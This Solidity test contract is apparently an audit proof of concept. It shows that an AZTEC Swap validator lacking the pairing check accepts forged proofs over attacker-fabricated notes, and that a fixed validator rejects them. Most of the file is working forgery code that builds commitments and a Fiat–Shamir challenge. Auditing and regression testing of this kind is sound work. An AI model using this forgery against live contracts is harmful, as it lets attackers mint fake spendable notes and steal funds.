// SPDX-License-Identifier: LGPL-3.0-only
pragma solidity >=0.5.0 <0.6.0;

import "../src/Swap.sol";
import "../src/SwapFixed.sol";

/**
 * AuditVault #16736 — the AZTEC `Swap` validator is missing the elliptic-curve
 * pairing check, so it never binds the note commitments to the trusted setup.
 *
 * This PoC builds a FORGED Swap transcript ENTIRELY ON-CHAIN (bn128 precompiles):
 * four notes whose points are the plain generator G — NOT trusted-setup points —
 * committing to attacker-chosen values, plus a self-consistent Fiat–Shamir
 * challenge.  The real (vulnerable) `Swap` accepts it and emits the fabricated
 * output notes as registry-admissible notes; the real hardened `SwapFixed`
 * (which restores the pairing/accumulator binding) rejects the identical proof.
 *
 * There is no synthetic validator here: `Swap` and `SwapFixed` are the real
 * audited AZTEC source, unmodified.
 */
contract PoC_16736 {
    // bn128 generators.  H is AZTEC's second generator (real CRS h point).
    uint256 constant Gx = 1;
    uint256 constant Gy = 2;
    uint256 constant Hx = 0x00164b60d0fa1eab5d56d9653aed9dc7f7473acbe61df67134c705638441c4b9;
    uint256 constant Hy = 0x2bb1b9b55ffdcf2d7254dfb9be2cb4e908611b4adeb4b838f0442fce79416cf0;
    // bn128 group order r.
    uint256 constant R  = 0x30644e72e131a029b85045b68181585d2833e84879b9709143e1f593f0000001;
    // Real AZTEC trusted-setup G2 point t2 (used only to prove the fixed validator
    // rejects the forgery via its pairing check).
    uint256 constant T2x0 = 0x0118c4d5b837bcc2bc89b5b398b5974e9f5944073b32078b7e231fec938883b0;
    uint256 constant T2x1 = 0x260e01b251f6f1c7e7ff4e580791dee8ea51d87a358e038b4efe30fac09383c1;
    uint256 constant T2y0 = 0x22febda3c0c0632a56475b4214e5615e11e6dd3f96e6cea2854a87d4dacc5e55;
    uint256 constant T2y1 = 0x04fc6369f7110fe3d25156c1bb9a72859cf2a04641f99ba4ee413c80da6a5fe4;

    function ecMul(uint256 x, uint256 y, uint256 s) internal view returns (uint256 rx, uint256 ry) {
        uint256[3] memory input;
        input[0] = x; input[1] = y; input[2] = s;
        uint256[2] memory out;
        bool ok;
        assembly { ok := staticcall(gas, 7, input, 0x60, out, 0x40) }
        require(ok, "ecMul failed");
        return (out[0], out[1]);
    }

    function ecAdd(uint256 x1, uint256 y1, uint256 x2, uint256 y2) internal view returns (uint256 rx, uint256 ry) {
        uint256[4] memory input;
        input[0] = x1; input[1] = y1; input[2] = x2; input[3] = y2;
        uint256[2] memory out;
        bool ok;
        assembly { ok := staticcall(gas, 6, input, 0x80, out, 0x40) }
        require(ok, "ecAdd failed");
        return (out[0], out[1]);
    }

    // Pedersen-style commitment G^kval * H^aval (a bn128 point).
    function commit(uint256 kval, uint256 aval) internal view returns (uint256, uint256) {
        (uint256 gx, uint256 gy) = ecMul(Gx, Gy, kval);
        (uint256 hx, uint256 hy) = ecMul(Hx, Hy, aval);
        return ecAdd(gx, gy, hx, hy);
    }

    // Compressed note coordinate, exactly as SwapABIEncoder emits it.
    function compress(uint256 x, uint256 y) internal pure returns (bytes32) {
        if (y & 1 == 1) {
            x = x | 0x8000000000000000000000000000000000000000000000000000000000000000;
        }
        return bytes32(x);
    }

    // Build a forged Swap proof over four fabricated notes with attacker-chosen
    // values.  Note[i].value = k[i]; k[2]=k[0], k[3]=k[1] (the swap-matching the
    // challenge check enforces).  sigma[i] = G^k[i] * H^a[i] is a commitment the
    // attacker computes itself — G is the plain generator, so these notes are NOT
    // bound to the trusted setup, which only the pairing check would detect.
    function buildForgedProof(address sender)
        internal view
        returns (bytes memory proofData, bytes32 outNote2Sigma, bytes32 outNote1Sigma)
    {
        uint256 challenge;
        uint256[24] memory nw; // the four notes' words, [kbar,abar,gx,gy,sx,sy] x4
        (challenge, nw, outNote2Sigma, outNote1Sigma) = _computeNoteWords(sender);

        // Assemble proofData: header, four notes, four owners, and the real
        // (verbatim) metadata tail so SwapABIEncoder emits cleanly.
        proofData = abi.encodePacked(
            challenge,
            uint256(0xa0),  // notes section pointer
            uint256(0x3c0), // owners pointer
            uint256(0x460), // metadata pointer
            uint256(4)      // number of notes
        );
        for (uint256 i = 0; i < 24; i++) {
            proofData = abi.encodePacked(proofData, nw[i]);
        }
        uint256 ownerWord = uint256(uint160(sender));
        proofData = abi.encodePacked(proofData, uint256(4), ownerWord, ownerWord, ownerWord, ownerWord);
        proofData = abi.encodePacked(proofData, _metadataTail());
    }

    // Compute the four fabricated notes and the matching Fiat–Shamir challenge.
    function _computeNoteWords(address sender)
        internal view
        returns (uint256 challenge, uint256[24] memory nw, bytes32 outNote2Sigma, bytes32 outNote1Sigma)
    {
        // Fabricated values and blinding factors.  k1=k3 is a huge "received" value.
        uint256[4] memory k;   k[0]=100; k[1]=1000000000000000000; k[2]=k[0]; k[3]=k[1];
        uint256[4] memory a;   a[0]=3;   a[1]=5;   a[2]=7;   a[3]=11;
        uint256[4] memory kap; kap[0]=13; kap[1]=17; kap[2]=kap[0]; kap[3]=kap[1];
        uint256[4] memory alp; alp[0]=19; alp[1]=23; alp[2]=29; alp[3]=31;
        uint256[4] memory sx; uint256[4] memory sy;

        // sigma_i = G^k_i * H^a_i ; T_i = G^kap_i * H^alp_i (= verifier's B_i).
        // Build the B_i portion of the Fiat-Shamir preimage as we go.
        bytes memory bpart;
        uint256 i;
        for (i = 0; i < 4; i++) {
            (sx[i], sy[i]) = commit(k[i], a[i]);
            (uint256 txi, uint256 tyi) = commit(kap[i], alp[i]);
            bpart = abi.encodePacked(bpart, txi, tyi);
        }
        // challenge = keccak256(sender || (gamma_i,sigma_i)_i || (B_i)_i) mod r,
        // reconstructed byte-for-byte as Swap.validateSwap hashes it.
        bytes memory cpart = abi.encodePacked(bytes32(uint256(uint160(sender))));
        for (i = 0; i < 4; i++) {
            cpart = abi.encodePacked(cpart, Gx, Gy, sx[i], sy[i]);
        }
        challenge = uint256(keccak256(abi.encodePacked(cpart, bpart))) % R;

        // Responses kbar_i = kap_i + c*k_i, abar_i = alp_i + c*a_i (mod r), packed
        // into the note words [kbar, abar, gamma_x=G, gamma_y=G, sigma_x, sigma_y].
        for (i = 0; i < 4; i++) {
            nw[i*6+0] = addmod(kap[i], mulmod(challenge, k[i], R), R);
            nw[i*6+1] = addmod(alp[i], mulmod(challenge, a[i], R), R);
            nw[i*6+2] = Gx;
            nw[i*6+3] = Gy;
            nw[i*6+4] = sx[i];
            nw[i*6+5] = sy[i];
        }
        outNote2Sigma = compress(sx[2], sy[2]); // proofOutputs[0].outputNotes[0]
        outNote1Sigma = compress(sx[1], sy[1]); // proofOutputs[1].outputNotes[0]
    }

    function _metadataTail() internal pure returns (bytes memory) {
        return hex"00000000000000000000000000000000000000000000000000000000000000e20000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000008000000000000000000000000000000000000000000000000000000000000000c1000000000000000000000000000000000000000000000000000000000000002102000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000210200000000000000000000000000000000000000000000000000000000000000000000";
    }

    function crs() internal pure returns (uint256[6] memory c) {
        c[0] = Hx; c[1] = Hy; c[2] = T2x0; c[3] = T2x1; c[4] = T2y0; c[5] = T2y1;
    }

    function contains(bytes memory haystack, bytes32 needle) internal pure returns (bool) {
        if (haystack.length < 32) return false;
        for (uint256 i = 0; i + 32 <= haystack.length; i++) {
            bool eq = true;
            for (uint256 j = 0; j < 32; j++) {
                if (haystack[i + j] != needle[j]) { eq = false; break; }
            }
            if (eq) return true;
        }
        return false;
    }

    // HARM: the vulnerable validator accepts a proof over attacker-fabricated
    // notes and emits them as registry-admissible output notes.
    function test_vulnerable_accepts_forged_notes() public {
        Swap vulnerable = new Swap();
        (bytes memory proofData, bytes32 outSig2, bytes32 outSig1) = buildForgedProof(address(this));

        (bool ok, bytes memory proofOutputs) = address(vulnerable).staticcall(
            abi.encodeWithSignature("validateSwap(bytes,address,uint256[6])",
                proofData, address(this), crs()));

        require(ok, "vulnerable Swap rejected the forged proof");
        require(proofOutputs.length > 0, "no proofOutputs returned");
        // The fabricated output notes (which the attacker fully controls and knows
        // the value of) are present in the validator's output -> they would be
        // written to the note registry as spendable notes.
        require(contains(proofOutputs, outSig1), "forged output note 1 not admitted");
        require(contains(proofOutputs, outSig2), "forged output note 2 not admitted");
    }

    // The hardened validator (pairing + accumulator binding restored) rejects the
    // identical forged proof.
    function test_fixed_rejects_forged_notes() public {
        SwapFixed fixedValidator = new SwapFixed();
        (bytes memory proofData,,) = buildForgedProof(address(this));

        (bool ok,) = address(fixedValidator).staticcall(
            abi.encodeWithSignature("validateSwap(bytes,address,uint256[6])",
                proofData, address(this), crs()));

        require(!ok, "fixed validator accepted the forged proof");
    }
}
